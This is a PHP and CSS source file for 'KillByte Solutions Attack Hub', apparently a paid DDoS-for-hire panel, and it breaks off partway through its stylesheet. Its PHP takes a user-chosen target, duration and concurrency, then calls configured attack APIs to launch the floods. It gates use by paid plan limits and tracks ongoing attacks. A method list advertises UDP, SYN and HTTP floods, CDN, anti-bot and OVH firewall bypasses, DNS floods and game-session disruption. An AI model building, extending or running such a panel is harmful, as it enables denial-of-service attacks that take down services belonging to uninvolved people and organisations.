<?php
session_start();
error_reporting(0);
ini_set('display_errors', 0);

// Check if user is logged in
if (!isset($_SESSION['username'])) {
    header('Location: login');
    exit;
}

// Set default language if not set
if (!isset($_SESSION['lang'])) {
    $_SESSION['lang'] = 'en';
}

// Clean expired attacks from ng.txt
$current_time = time();
$attacks = [];
if (file_exists('ng.txt')) {
    $lines = file('ng.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $new_lines = [];
    foreach ($lines as $line) {
        $attack = json_decode($line, true);
        if ($current_time <= $attack['end_time']) {
            $new_lines[] = $line;
            if ($attack['username'] === $_SESSION['username']) {
                $attacks[] = $attack;
            }
        }
    }
    file_put_contents('ng.txt', implode("\n", $new_lines) . "\n");
}

// Function to log attack to admin log
function logAttack($username, $target, $method, $duration, $concurrents, $status = 'launched') {
    $logEntry = [
        'username'    => $username,
        'target'      => $target,
        'method'      => $method,
        'duration'    => $duration,
        'concurrents' => $concurrents,
        'start_time'  => time(),
        'end_time'    => time() + $duration,
        'status'      => $status,
        'id'          => uniqid()
    ];
    $logFile = 'admin/attacks.log';
    // Ensure directory exists
    if (!is_dir('admin')) {
        mkdir('admin', 0755, true);
    }
    file_put_contents($logFile, json_encode($logEntry) . "\n", FILE_APPEND);
}

// Handle attack launch - only if it's a fresh POST request, not a refresh
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['launch']) && (!isset($_SESSION['last_post_time']) || $_SESSION['last_post_time'] != $_SERVER['REQUEST_TIME'])) {
    $_SESSION['last_post_time'] = $_SERVER['REQUEST_TIME'];
    
    $target = $_POST['target'] ?? '';
    $method = $_POST['method'] ?? '';
    $duration = (int)($_POST['duration'] ?? 0);
    $concurrents = (int)($_POST['concurrents'] ?? 1);
    
    $errors = [];
    
    // Check for blacklisted targets
    if (stripos($target, 'gov') !== false || 
        stripos($target, 'edu') !== false ||
        stripos($target, '.gov') !== false ||
        stripos($target, '.edu') !== false ||
        stripos($target, 'l7syria') !== false ||
        stripos($target, '127.0.0.1') !== false) {
        $errors[] = "This target is blacklisted";
    }
    
    // Validation
    if (empty($target) || empty($method) || $duration <= 0) {
        $errors[] = "Please fill in all fields correctly";
    }
    
    if ($duration > $_SESSION['running']) {
        $errors[] = "Duration exceeds your maximum allowed time";
    }
    
    if ($concurrents > $_SESSION['concurrent']) {
        $errors[] = "Concurrent attacks exceed your plan limit";
    }
    
    // Check current ongoing attacks for user
    $current_concurrent = 0;
    foreach ($attacks as $attack) {
        $current_concurrent += $attack['concurrents'];
    }
    
    if (($current_concurrent + $concurrents) > $_SESSION['concurrent']) {
        $errors[] = "Would exceed maximum concurrent attacks";
    }
    
    if (empty($errors)) {
        // Load methods (only enabled ones)
        $methods = [];
        if (file_exists('methods.txt')) {
            $methods_data = file('methods.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            foreach ($methods_data as $method_line) {
                $parts = explode('|', $method_line);
                if (count($parts) >= 3) {
                    $name = trim($parts[0]);
                    $api  = trim($parts[1]);
                    $enabled = trim($parts[2]) === '1';
                    if ($enabled) {
                        $methods[$name] = $api;
                    }
                }
            }
        }
        
        if (isset($methods[$method])) {
            $api_url = $methods[$method];
            $api_url = str_replace('<target>', urlencode($target), $api_url);
            $api_url = str_replace('<duration>', $duration, $api_url);
            
            // Launch attacks asynchronously in batches of 5
            $batch_size = 5;
            $total_batches = ceil($concurrents / $batch_size);
            
            for ($batch = 0; $batch < $total_batches; $batch++) {
                $batch_concurrents = min($batch_size, $concurrents - ($batch * $batch_size));
                
                $mh = curl_multi_init();
                $curl_handles = [];
                
                for ($i = 0; $i < $batch_concurrents; $i++) {
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, $api_url);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_TIMEOUT, 1);
                    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 1);
                    curl_multi_add_handle($mh, $ch);
                    $curl_handles[] = $ch;
                }
                
                $running = null;
                do {
                    curl_multi_exec($mh, $running);
                } while ($running);
                
                foreach ($curl_handles as $ch) {
                    curl_multi_remove_handle($mh, $ch);
                    curl_close($ch);
                }
                curl_multi_close($mh);
                
                if ($batch < $total_batches - 1) {
                    usleep(100000);
                }
            }
            
            // Add to ongoing attacks in ng.txt
            $new_attack = [
                'username' => $_SESSION['username'],
                'target' => $target,
                'method' => $method,
                'concurrents' => $concurrents,
                'start_time' => time(),
                'end_time' => time() + $duration,
                'id' => uniqid()
            ];
            
            file_put_contents('ng.txt', json_encode($new_attack) . "\n", FILE_APPEND);
            $attacks[] = $new_attack;
            
            // Update total launched attacks count
            $current_count = 0;
            if (file_exists('ln.txt')) {
                $current_count = (int)file_get_contents('ln.txt');
            }
            $new_count = $current_count + $concurrents;
            file_put_contents('ln.txt', $new_count);
            
            // ---------- LOG THE ATTACK ----------
            logAttack($_SESSION['username'], $target, $method, $duration, $concurrents);
            
            $_SESSION['success'] = "Attack launched successfully!";
        } else {
            $_SESSION['error'] = "Unknown or disabled method";
        }
    } else {
        $_SESSION['error'] = implode("<br>", $errors);
    }
    
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Handle stop attack via AJAX
if (isset($_GET['action']) && $_GET['action'] === 'stop_attack' && isset($_GET['id'])) {
    $attack_id = $_GET['id'];
    $lines = file('ng.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $new_lines = [];
    foreach ($lines as $line) {
        $attack = json_decode($line, true);
        if ($attack['id'] !== $attack_id || $attack['username'] !== $_SESSION['username']) {
            $new_lines[] = $line;
        }
    }
    file_put_contents('ng.txt', implode("\n", $new_lines) . "\n");
    exit('stopped');
}

// Load available methods with descriptions (bilingual) – only enabled methods
$methods = [];           // clean_name => api_url
$method_descriptions = [
    '!c-flood'      => ['en' => 'Massive flood – 48M RPS, full backend/CDN bypass', 'zh' => '大规模洪水攻击 – 48M RPS，绕过所有后端/CDN'],
    '!c-browser'    => ['en' => 'Browser traffic sim – JS exec + TLS fp random', 'zh' => '浏览器流量模拟 – JS执行 + TLS指纹随机化'],
    '!c-bypass'     => ['en' => 'High RPS method with advanced CDN bypass', 'zh' => '高RPS方法，高级CDN绕过能力'],
    '!overload'     => ['en' => 'HTTP flood – 12M RPS instantly overwhelms backend', 'zh' => 'HTTP洪水 – 12M RPS瞬间压垮后端'],
    '!rapidreset'   => ['en' => 'Session resetter – drops HTTP sessions via TCP RST', 'zh' => '会话重置器 – 通过TCP RST断开HTTP会话'],
    '!http-exploit' => ['en' => 'Protocol abuse – malformed requests crash parsers', 'zh' => '协议滥用 – 畸形请求导致解析器崩溃'],
    '!spectre'      => ['en' => 'JS bypass – simulates browser logic to evade anti-bot', 'zh' => 'JS绕过 – 模拟浏览器逻辑躲避反机器人检测'],
    '!h-flood'      => ['en' => 'Hybrid HTTP flood – mixed GET/POST/HEAD + HTTP/2', 'zh' => '混合HTTP洪水 – GET/POST/HEAD混合 + HTTP/2'],
    '!ovh'          => ['en' => 'OVH bypass – breaks OVH game & VAC firewall stacks', 'zh' => 'OVH绕过 – 突破OVH游戏和VAC防火墙'],
    '!dns'          => ['en' => 'DNS spammer – floods resolvers with random queries', 'zh' => 'DNS泛洪 – 随机查询淹没解析器'],
    '!browser'      => ['en' => 'Basic browser flood – GET/HEAD spoofing with rotating headers', 'zh' => '基础浏览器洪水 – 伪造GET/HEAD并轮换请求头'],
    '!floodcore'    => ['en' => 'Standard HTTP flood – reliable POST/GET for weak endpoints', 'zh' => '标准HTTP洪水 – 对弱端点可靠的POST/GET攻击'],
    '!game'         => ['en' => 'Game disruptor – injects latency and crashes real-time sessions', 'zh' => '游戏干扰器 – 注入延迟并崩溃实时会话'],
    '!udp'          => ['en' => 'Raw UDP flood – 1.5M+ PPS for bandwidth saturation', 'zh' => '原始UDP洪水 – 1.5M+ PPS带宽饱和攻击'],
    '!tcp'          => ['en' => 'SYN/RST flooder – rapidly crashes port handlers', 'zh' => 'SYN/RST洪水 – 快速崩溃端口处理器'],
];

if (file_exists('methods.txt')) {
    $methods_data = file('methods.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($methods_data as $method_line) {
        $parts = explode('|', $method_line);
        if (count($parts) >= 3) {
            $name    = trim($parts[0]);
            $api     = trim($parts[1]);
            $enabled = trim($parts[2]) === '1';
            if ($enabled) {
                $methods[$name] = $api;   // only enabled methods
            }
        }
    }
}

// Determine if user has an active plan (running>0 && concurrent>0)
$has_plan = ($_SESSION['running'] > 0 && $_SESSION['concurrent'] > 0);

// Translation strings
$lang = $_SESSION['lang'];
$t = [
    'en' => [
        'app_name' => 'KillByte Solutions',
        'hub_title' => 'Attack Hub',
        'nav_home' => 'Home',
        'nav_hub' => 'Attack Hub',
        'nav_pricing' => 'Pricing',
        'nav_api' => 'API',
        'nav_profile' => 'Profile',
        'nav_admin' => 'Admin Dashboard',
        'nav_logout' => 'Logout',
        'plan_overlay_title' => 'Unlock Full Power',
        'plan_overlay_desc' => 'You need an active plan to launch attacks. Choose a plan that fits your testing needs.',
        'plan_overlay_btn' => 'View Plans',
        'form_title' => 'Launch Attack',
        'form_target' => 'Target',
        'form_method' => 'Method',
        'form_method_placeholder' => 'Select method...',
        'form_method_search' => 'Search methods...',
        'form_duration' => 'Duration (seconds)',
        'form_concurrents' => 'Concurrent Attacks',
        'form_launch' => 'Launch Attack',
        'ongoing_title' => 'Ongoing Attacks',
        'no_ongoing' => 'No ongoing attacks.',
        'attack_target' => 'Target',
        'attack_method' => 'Method',
        'attack_concurrents' => 'Concurrents',
        'attack_timeleft' => 'Time Left',
        'attack_stop' => 'Stop',
        'method_library_title' => 'Method Library',
        'method_library_search' => 'Search methods...',
        'method_library_close' => 'Close',
        'status_success' => 'Attack launched successfully!',
        'status_error' => 'Error',
        'no_methods' => 'No methods available',
    ],
    'zh' => [
        'app_name' => 'KillByte 解决方案',
        'hub_title' => '攻击中心',
        'nav_home' => '主页',
        'nav_hub' => '攻击中心',
        'nav_pricing' => '定价',
        'nav_api' => 'API',
        'nav_profile' => '个人资料',
        'nav_admin' => '管理面板',
        'nav_logout' => '登出',
        'plan_overlay_title' => '解锁全部力量',
        'plan_overlay_desc' => '您需要有效套餐才能发起攻击。选择适合您测试需求的套餐。',
        'plan_overlay_btn' => '查看套餐',
        'form_title' => '发起攻击',
        'form_target' => '目标',
        'form_method' => '方法',
        'form_method_placeholder' => '选择方法...',
        'form_method_search' => '搜索方法...',
        'form_duration' => '持续时间（秒）',
        'form_concurrents' => '并发攻击数',
        'form_launch' => '发起攻击',
        'ongoing_title' => '进行中的攻击',
        'no_ongoing' => '没有进行中的攻击。',
        'attack_target' => '目标',
        'attack_method' => '方法',
        'attack_concurrents' => '并发数',
        'attack_timeleft' => '剩余时间',
        'attack_stop' => '停止',
        'method_library_title' => '方法库',
        'method_library_search' => '搜索方法...',
        'method_library_close' => '关闭',
        'status_success' => '攻击成功发起！',
        'status_error' => '错误',
        'no_methods' => '暂无可用方法',
    ]
];
$tr = $t[$lang];
?>
<!DOCTYPE html>
<html lang="<?php echo $lang; ?>" data-theme="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
    <meta name="theme-color" content="#000000">
    <title><?php echo $tr['app_name']; ?> | <?php echo $tr['hub_title']; ?></title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>◈</text></svg>">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=JetBrains+Mono:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/ScrollTrigger.min.js"></script>
    <script src="https://unpkg.com/@studio-freight/lenis@1.0.36/dist/lenis.min.js"></script>
    <style>
        /* ===== RESET & BASE ===== */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html { scroll-behavior: auto; }
        body {
            font-family: 'Inter', sans-serif;
            background: #000000;
            color: #f0f0f0;
            line-height: 1.6;
            overflow-x: hidden;
            min-height: 100vh;
            -webkit-font-smoothing: antialiased;
            transition: background 0.4s, color 0.4s;
        }
        ::-webkit-scrollbar { width: 2px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: rgba(204,17,17,0.15); border-radius: 1px; }

        /* ===== CSS VARIABLES ===== */
        :root {
            --bg-void: #000000;
            --bg-deep: #010101;
            --bg-surface: #030303;
            --bg-elevated: #060606;
            --bg-glass: rgba(255,255,255,0.015);
            --bg-glass-hover: rgba(255,255,255,0.025);
            --text-primary: #f0f0f0;
            --text-secondary: #8a8a8a;
            --text-tertiary: #555555;
            --accent-crimson: #cc1111;
            --accent-crimson-bright: #ee2222;
            --accent-crimson-dim: rgba(204,17,17,0.04);
            --border-subtle: rgba(255,255,255,0.02);
            --border-crimson: rgba(204,17,17,0.08);
            --gradient-crimson: linear-gradient(135deg, #cc1111 0%, #aa0e0e 50%, #880a0a 100%);
            --font-display: 'Space Grotesk', sans-serif;
            --font-mono: 'JetBrains Mono', monospace;
            --ease-out-expo: cubic-bezier(0.16, 1, 0.3, 1);
        }
        [data-theme="light"] {
            --bg-void: #f0f0f0;
            --bg-deep: #e8e8e8;
            --bg-surface: #e0e0e0;
            --bg-elevated: #d8d8d8;
            --bg-glass: rgba(0,0,0,0.02);
            --bg-glass-hover: rgba(0,0,0,0.04);
            --text-primary: #1a1a1a;
            --text-secondary: #4a4a4a;
            --text-tertiary: #7a7a7a;
            --border-subtle: rgba(0,0,0,0.04);
            --border-crimson: rgba(204,17,17,0.1);
        }

        /* ===== INFINITE PERSPECTIVE SQUARE GRID ===== */
        .grid-container {
            position: fixed;
            inset: 0;
            z-index: 0;
            pointer-events: none;
            overflow: hidden;
            perspective: 1200px;
            perspective-origin: 50% 50%;
        }
        .grid-surface {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) rotateX(60deg) scale(1.4);
            width: 200%;
            height: 200%;
            transform-style: preserve-3d;
        }
        .grid-squares {
            position: absolute;
            inset: 0;
            display: grid;
            grid-template-columns: repeat(12, 1fr);
            grid-template-rows: repeat(12, 1fr);
            gap: 0;
            width: 100%;
            height: 100%;
            animation: gridPulse 8s ease-in-out infinite;
        }
        .grid-square {
            border: 1px solid rgba(255,255,255,0.012);
            background: rgba(255,255,255,0.002);
            transition: all 0.8s ease;
            position: relative;
        }
        .grid-square::after {
            content: '';
            position: absolute;
            inset: 0;
            background: radial-gradient(ellipse at center, rgba(204,17,17,0.02), transparent 70%);
            opacity: 0;
            transition: opacity 0.8s ease;
        }
        .grid-square:hover::after { opacity: 1; }
        .grid-square.highlight {
            border-color: rgba(204,17,17,0.04);
            background: rgba(204,17,17,0.01);
        }
        .grid-square.highlight::after { opacity: 1; }
        @keyframes gridPulse {
            0%, 100% { transform: scale(1) rotateX(0deg); }
            50% { transform: scale(1.01) rotateX(1deg); }
        }

        /* ===== CRIMSON REFLECTION ===== */
        .crimson-reflection {
            position: fixed;
            inset: 0;
            z-index: 1;
            pointer-events: none;
            background:
                radial-gradient(ellipse at 20% 80%, rgba(204,17,17,0.02) 0%, transparent 50%),
                radial-gradient(ellipse at 80% 20%, rgba(204,17,17,0.015) 0%, transparent 50%),
                radial-gradient(ellipse at 50% 50%, rgba(204,17,17,0.008) 0%, transparent 70%);
        }
        [data-theme="light"] .crimson-reflection {
            background:
                radial-gradient(ellipse at 20% 80%, rgba(204,17,17,0.03) 0%, transparent 50%),
                radial-gradient(ellipse at 80% 20%, rgba(204,17,17,0.02) 0%, transparent 50%);
        }

        /* ===== VIGNETTE ===== */
        .vignette-luxury {
            position: fixed;
            inset: 0;
            z-index: 2;
            pointer-events: none;
            background: radial-gradient(ellipse at center, transparent 50%, rgba(0,0,0,0.5) 100%);
        }
        [data-theme="light"] .vignette-luxury {
            background: radial-gradient(ellipse at center, transparent 50%, rgba(0,0,0,0.06) 100%);
        }

        /* ===== GLASS SWEEP ===== */
        .glass-sweep {
            position: fixed;
            inset: 0;
            z-index: 3;
            pointer-events: none;
            background: linear-gradient(105deg,
                transparent 40%,
                rgba(255,255,255,0.008) 45%,
                rgba(255,255,255,0.015) 50%,
                rgba(255,255,255,0.008) 55%,
                transparent 60%
            );
            transform: translateX(-100%);
            animation: sweepGloss 12s ease-in-out infinite;
        }
        [data-theme="light"] .glass-sweep {
            background: linear-gradient(105deg,
                transparent 40%,
                rgba(255,255,255,0.06) 45%,
                rgba(255,255,255,0.10) 50%,
                rgba(255,255,255,0.06) 55%,
                transparent 60%
            );
        }
        @keyframes sweepGloss {
            0% { transform: translateX(-100%); opacity: 0; }
            6% { opacity: 1; }
            25% { transform: translateX(100%); opacity: 1; }
            30% { opacity: 0; }
            100% { transform: translateX(100%); opacity: 0; }
        }

        /* ===== CURSOR ===== */
        .cursor-dot {
            position: fixed;
            width: 6px;
            height: 6px;
            background: var(--accent-crimson);
            border-radius: 50%;
            pointer-events: none;
            z-index: 99999;
            mix-blend-mode: difference;
            transform: translate(-50%, -50%);
            box-shadow: 0 0 30px rgba(204,17,17,0.3);
            transition: transform 0.15s var(--ease-out-expo), width 0.3s, height 0.3s;
        }
        .cursor-dot.expanded {
            width: 40px;
            height: 40px;
            background: rgba(204,17,17,0.06);
            border: 1px solid rgba(204,17,17,0.15);
            mix-blend-mode: normal;
        }
        @media (pointer: coarse) { .cursor-dot { display: none; } }

        /* ===== NAVIGATION ===== */
        .navbar {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 68px;
            background: rgba(0,0,0,0.25);
            backdrop-filter: blur(60px) saturate(180%);
            -webkit-backdrop-filter: blur(60px) saturate(180%);
            border-bottom: 1px solid rgba(255,255,255,0.015);
            z-index: 1000;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 2.5rem;
            transition: all 0.6s var(--ease-out-expo);
        }
        [data-theme="light"] .navbar {
            background: rgba(255,255,255,0.4);
            border-bottom-color: rgba(0,0,0,0.04);
        }
        .navbar.scrolled {
            height: 56px;
            background: rgba(0,0,0,0.6);
            box-shadow: 0 20px 60px rgba(0,0,0,0.2);
        }
        [data-theme="light"] .navbar.scrolled {
            background: rgba(255,255,255,0.7);
        }

        .nav-brand {
            display: flex;
            align-items: center;
            gap: 12px;
            text-decoration: none;
        }
        .nav-brand-icon {
            width: 32px;
            height: 32px;
            background: var(--gradient-crimson);
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 16px;
            box-shadow: 0 0 30px rgba(204,17,17,0.08);
        }
        .nav-brand-text {
            font-family: var(--font-display);
            font-size: 1.1rem;
            font-weight: 600;
            color: var(--text-primary);
            letter-spacing: -0.03em;
        }
        .nav-brand-text span {
            font-weight: 300;
            color: var(--text-secondary);
        }

        .nav-links {
            display: flex;
            align-items: center;
            gap: 1.8rem;
        }
        .nav-link {
            color: var(--text-secondary);
            text-decoration: none;
            font-size: 0.7rem;
            font-weight: 500;
            letter-spacing: 0.06em;
            transition: all 0.4s var(--ease-out-expo);
            position: relative;
            padding: 0.4rem 0;
            text-transform: uppercase;
        }
        .nav-link::after {
            content: '';
            position: absolute;
            bottom: -1px;
            left: 0;
            width: 0;
            height: 1px;
            background: var(--accent-crimson);
            transition: width 0.4s var(--ease-out-expo);
            box-shadow: 0 0 20px rgba(204,17,17,0.3);
        }
        .nav-link:hover { color: var(--text-primary); }
        .nav-link:hover::after { width: 100%; }
        .nav-link.active { color: var(--text-primary); }
        .nav-link.active::after { width: 100%; }

        .nav-cta {
            background: var(--gradient-crimson);
            color: white;
            padding: 0.5rem 1.4rem;
            border-radius: 99px;
            text-decoration: none;
            font-size: 0.65rem;
            font-weight: 600;
            letter-spacing: 0.06em;
            text-transform: uppercase;
            transition: all 0.4s var(--ease-out-expo);
            border: none;
            box-shadow: 0 4px 30px rgba(204,17,17,0.06);
            cursor: pointer;
        }
        .nav-cta:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 40px rgba(204,17,17,0.12);
        }

        .nav-auth {
            display: flex;
            gap: 0.4rem;
            align-items: center;
        }
        .nav-auth a {
            color: var(--text-secondary);
            text-decoration: none;
            font-size: 0.65rem;
            font-weight: 500;
            padding: 0.35rem 0.8rem;
            border-radius: 99px;
            border: 1px solid rgba(255,255,255,0.03);
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 0.06em;
        }
        .nav-auth a:hover {
            border-color: var(--border-crimson);
            color: var(--accent-crimson);
            background: var(--accent-crimson-dim);
        }

        .lang-switch {
            display: flex;
            gap: 3px;
            margin-left: 0.6rem;
            background: rgba(255,255,255,0.01);
            padding: 3px;
            border-radius: 99px;
            border: 1px solid rgba(255,255,255,0.02);
        }
        .lang-btn {
            background: none;
            border: none;
            color: var(--text-secondary);
            padding: 0.25rem 0.6rem;
            border-radius: 99px;
            font-size: 0.55rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: var(--font-mono);
            text-transform: uppercase;
            letter-spacing: 0.06em;
        }
        .lang-btn.active {
            background: var(--accent-crimson);
            color: white;
            box-shadow: 0 0 20px rgba(204,17,17,0.1);
        }
        .lang-btn:hover:not(.active) { color: var(--text-primary); }

        .theme-toggle {
            background: none;
            border: none;
            color: var(--text-secondary);
            font-size: 0.9rem;
            cursor: pointer;
            transition: all 0.3s;
            margin-left: 0.6rem;
        }
        .theme-toggle:hover { color: var(--text-primary); }

        /* ===== FULL-SCREEN PLAN OVERLAY ===== */
        .plan-overlay-full {
            position: fixed;
            inset: 0;
            z-index: 9998;
            background: rgba(0,0,0,0.85);
            backdrop-filter: blur(60px) saturate(180%);
            -webkit-backdrop-filter: blur(60px) saturate(180%);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            padding: 2rem;
            animation: fadeIn 0.6s var(--ease-out-expo);
        }
        .plan-overlay-full .icon {
            font-size: 4rem;
            color: var(--accent-crimson);
            margin-bottom: 1.5rem;
            opacity: 0.8;
            filter: drop-shadow(0 0 40px rgba(204,17,17,0.1));
        }
        .plan-overlay-full h3 {
            font-family: var(--font-display);
            font-size: clamp(2rem, 5vw, 3.5rem);
            font-weight: 600;
            margin-bottom: 0.8rem;
            letter-spacing: -0.02em;
        }
        .plan-overlay-full p {
            color: var(--text-secondary);
            max-width: 500px;
            margin: 0 auto 2rem;
            font-size: 1.1rem;
            line-height: 1.7;
        }
        .plan-overlay-full .btn-primary {
            background: var(--gradient-crimson);
            color: white;
            padding: 1rem 2.5rem;
            border-radius: 99px;
            text-decoration: none;
            font-weight: 600;
            font-size: 1rem;
            transition: all 0.4s var(--ease-out-expo);
            border: none;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            gap: 0.8rem;
            box-shadow: 0 4px 40px rgba(204,17,17,0.06);
        }
        .plan-overlay-full .btn-primary:hover {
            transform: translateY(-3px);
            box-shadow: 0 12px 50px rgba(204,17,17,0.12);
        }
        .plan-overlay-full .btn-primary i {
            font-size: 1.1rem;
        }

        /* ===== MAIN CONTENT ===== */
        .main-content {
            position: relative;
            z-index: 10;
            padding: 120px 2rem 80px;
            max-width: 1200px;
            margin: 0 auto;
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 2rem;
            align-items: start;
        }
        @media (max-width: 1024px) {
            .main-content { grid-template-columns: 1fr; }
        }
        @media (max-width: 768px) {
            .main-content { padding: 100px 1.2rem 60px; }
        }

        /* ===== GLASS PANEL ===== */
        .glass-panel {
            background: var(--bg-glass);
            backdrop-filter: blur(40px) saturate(180%);
            -webkit-backdrop-filter: blur(40px) saturate(180%);
            border: 1px solid var(--border-subtle);
            border-radius: 24px;
            padding: 2rem;
            box-shadow: 0 20px 60px rgba(0,0,0,0.1);
            transition: all 0.6s var(--ease-out-expo);
            position: relative;
            overflow: hidden;
        }
        .glass-panel:hover {
            border-color: var(--border-crimson);
            box-shadow: 0 30px 80px rgba(0,0,0,0.15);
        }
        .glass-panel::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 1px;
            background: var(--gradient-crimson);
            opacity: 0.2;
        }
        .panel-title {
            font-family: var(--font-display);
            font-size: 1.5rem;
            font-weight: 600;
            margin-bottom: 1.5rem;
            letter-spacing: -0.02em;
            display: flex;
            align-items: center;
            gap: 0.6rem;
        }
        .panel-title i { color: var(--accent-crimson); font-size: 1.2rem; }

        /* ===== FORM ===== */
        .form-group {
            margin-bottom: 1.5rem;
        }
        .form-group label {
            display: block;
            font-size: 0.7rem;
            text-transform: uppercase;
            letter-spacing: 0.12em;
            color: var(--text-tertiary);
            margin-bottom: 0.4rem;
            font-weight: 500;
        }
        .form-input, .form-select-custom {
            width: 100%;
            padding: 0.8rem 1rem;
            background: rgba(255,255,255,0.005);
            border: 1px solid var(--border-subtle);
            color: var(--text-primary);
            border-radius: 12px;
            transition: all 0.3s ease;
            font-size: 0.85rem;
            outline: none;
            font-family: 'Inter', sans-serif;
        }
        .form-input:focus, .form-select-custom.focus {
            border-color: var(--accent-crimson);
            box-shadow: 0 0 30px rgba(204,17,17,0.02);
        }
        .form-input::placeholder {
            color: var(--text-tertiary);
            font-weight: 300;
        }

        /* ===== CUSTOM METHOD SELECTOR ===== */
        .method-selector {
            position: relative;
            cursor: pointer;
        }
        .method-selector .selected {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0.8rem 1rem;
            background: rgba(255,255,255,0.005);
            border: 1px solid var(--border-subtle);
            border-radius: 12px;
            transition: all 0.3s ease;
            color: var(--text-primary);
            font-size: 0.85rem;
        }
        .method-selector .selected:hover {
            border-color: var(--border-crimson);
        }
        .method-selector .selected .arrow {
            transition: transform 0.4s var(--ease-out-expo);
            color: var(--text-tertiary);
        }
        .method-selector.open .selected .arrow {
            transform: rotate(180deg);
        }
        .method-selector .dropdown {
            position: absolute;
            top: calc(100% + 6px);
            left: 0;
            right: 0;
            background: var(--bg-elevated);
            backdrop-filter: blur(40px);
            border: 1px solid var(--border-subtle);
            border-radius: 12px;
            padding: 0.5rem;
            max-height: 300px;
            overflow-y: auto;
            display: none;
            z-index: 20;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        .method-selector.open .dropdown {
            display: block;
            animation: fadeIn 0.2s var(--ease-out-expo);
        }
        .method-selector .dropdown input {
            width: 100%;
            padding: 0.6rem 0.8rem;
            background: rgba(255,255,255,0.005);
            border: 1px solid var(--border-subtle);
            border-radius: 8px;
            color: var(--text-primary);
            font-size: 0.8rem;
            outline: none;
            margin-bottom: 0.5rem;
            font-family: 'Inter', sans-serif;
        }
        .method-selector .dropdown input::placeholder {
            color: var(--text-tertiary);
        }
        .method-selector .dropdown .method-option {
            padding: 0.6rem 0.8rem;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.2s ease;
            display: flex;
            align-items: center;
            gap: 0.8rem;
            font-size: 0.8rem;
            color: var(--text-secondary);
        }
        .method-selector .dropdown .method-option:hover {
            background: var(--bg-glass-hover);
            color: var(--text-primary);
        }
        .method-selector .dropdown .method-option.selected-option {
            background: var(--accent-crimson-dim);
            color: var(--accent-crimson);
            border-left: 2px solid var(--accent-crimson);
        }
        .method-selector .dropdown .method-option i {
            width: 20px;
            color: var(--accent-crimson);
            opacity: 0.6;
        }
        .method-selector .dropdown .no-results {
            padding: 0.8rem;
            text-align: center;
            color: var(--text-tertiary);
            font-size: 0.8rem;
        }
        .method-library-btn {
            background: none;
            border: none;
            color: var(--text-tertiary);
            cursor: pointer;
            font-size: 0.8rem;
            transition: all 0.3s;
            margin-left: 0.5rem;
        }
        .method-library-btn:hover {
            color: var(--accent-crimson);
        }

        /* ===== ONGOING ATTACKS ===== */
        .ongoing-list {
            display: flex;
            flex-direction: column;
            gap: 1rem;
            max-height: 500px;
            overflow-y: auto;
            padding-right: 0.5rem;
        }
        .attack-card {
            background: rgba(255,255,255,0.005);
            border: 1px solid var(--border-subtle);
            border-radius: 16px;
            padding: 1.2rem;
            transition: all 0.3s var(--ease-out-expo);
            position: relative;
        }
        .attack-card:hover {
            border-color: var(--border-crimson);
            background: var(--bg-glass-hover);
        }
        .attack-card .top-row {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            gap: 1rem;
        }
        .attack-card .info {
            flex: 1;
        }
        .attack-card .info .target {
            font-weight: 500;
            font-size: 0.9rem;
            color: var(--text-primary);
            word-break: break-all;
        }
        .attack-card .info .method {
            font-size: 0.7rem;
            color: var(--text-tertiary);
            text-transform: uppercase;
            letter-spacing: 0.06em;
            margin-top: 0.2rem;
        }
        .attack-card .info .concurrents {
            font-size: 0.7rem;
            color: var(--text-secondary);
            margin-top: 0.2rem;
        }
        .attack-card .time-left {
            font-family: var(--font-mono);
            font-size: 1.1rem;
            font-weight: 500;
            color: var(--accent-crimson);
            white-space: nowrap;
        }
        .attack-card .time-left span { font-size: 0.7rem; color: var(--text-tertiary); font-weight: 400; }
        .attack-card .progress-wrap {
            margin-top: 0.8rem;
            height: 4px;
            background: rgba(255,255,255,0.05);
            border-radius: 2px;
            overflow: hidden;
        }
        .attack-card .progress-bar {
            height: 100%;
            background: var(--gradient-crimson);
            width: 0%;
            transition: width 0.3s linear;
        }
        .attack-card .stop-btn {
            background: none;
            border: none;
            color: var(--text-tertiary);
            cursor: pointer;
